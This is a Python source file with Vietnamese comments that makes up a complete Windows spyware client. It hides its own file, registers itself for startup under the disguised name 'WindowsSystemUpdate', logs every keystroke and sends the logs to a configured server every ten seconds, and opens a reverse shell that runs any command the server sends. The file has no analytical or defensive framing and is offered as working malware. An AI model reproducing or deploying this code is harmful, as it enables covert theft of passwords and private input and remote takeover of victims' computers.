import socket
import subprocess
import sys
import os
import time
import winreg
import threading

# ==========================================
# CẤU HÌNH HỆ THỐNG VÀ MẠNG
# ==========================================
SERVER_IP = '192.168.1.139'  # <-- THAY ĐỔI THÀNH IP CỦA MÁY SERVER
SHELL_PORT = 8080            # Cổng dành cho Remote Shell
LOG_PORT = 8081              # Cổng dành riêng để gửi dữ liệu Keylogger
SEND_INTERVAL = 10           # Thời gian gom phím gửi về server (giây)

def hide_self():
    """Tự động ẩn file chạy khỏi tầm mắt người dùng trên Windows"""
    try:
        current_file = os.path.abspath(__file__)
        if os.name == 'nt':
            subprocess.run(f'attrib +h +s "{current_file}"', shell=True, capture_output=True)
    except Exception:
        pass

def add_to_startup():
    """Tự động ghi vào Windows Registry để tự khởi động khi reset máy"""
    try:
        script_path = os.path.abspath(__file__)
        python_executable = sys.executable
        command = f'"{python_executable}" "{script_path}"'
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass

# ==========================================
# 1. TIẾN TRÌNH KEYLOGGER (BẮT PHÍM & GỬI NGẦM)
# ==========================================
class NetworkKeylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.lock = threading.Lock()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        
        with self.lock:
            self.log += name

    def send_logs(self):
        while True:
            time.sleep(self.interval)
            with self.lock:
                if not self.log:
                    continue
                current_log = self.log
                self.log = ""

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((SERVER_IP, LOG_PORT))
                s.send(current_log.encode('utf-8'))
                s.close()
            except Exception:
                with self.lock:
                    self.log = current_log + self.log

    def start_keylogger(self):
        try:
            import keyboard
            keyboard.on_release(callback=self.callback)
            t = threading.Thread(target=self.send_logs)
            t.daemon = True
            t.start()
        except Exception:
            pass

# ==========================================
# 2. TIẾN TRÌNH REMOTE SHELL (ĐIỀU KHIỂN TỪ XA)
# ==========================================
def client_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SHELL_PORT))
            
            while True:
                command = s.recv(4096).decode('utf-8', errors='ignore')
                if not command or command.lower() == "exit":
                    break

                try:
                    output = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        encoding='utf-8', 
                        errors='ignore'
                    )
                    out_str = output.stdout + output.stderr
                    if not out_str:
                        out_str = "[+] Lệnh đã được thực thi thành công (không có phản hồi văn bản).\n"
                except Exception as sub_err:
                    out_str = f"[-] Lỗi khi thực thi lệnh: {str(sub_err)}\n"

                s.send(out_str.encode('utf-8'))

            s.close()
        except Exception:
            time.sleep(5)

# ==========================================
# HÀM KHỞI CHẠY CHÍNH
# ==========================================
if __name__ == "__main__":
    # Kích hoạt các tính năng ẩn danh và duy trì hệ thống
    hide_self()
    add_to_startup()
    
    # 1. Chạy Keylogger ngầm trên một luồng riêng
    keylogger = NetworkKeylogger(interval=SEND_INTERVAL)
    keylogger.start_keylogger()
    
    # 2. Chạy vòng lặp Remote Shell ở luồng chính
    client_shell()
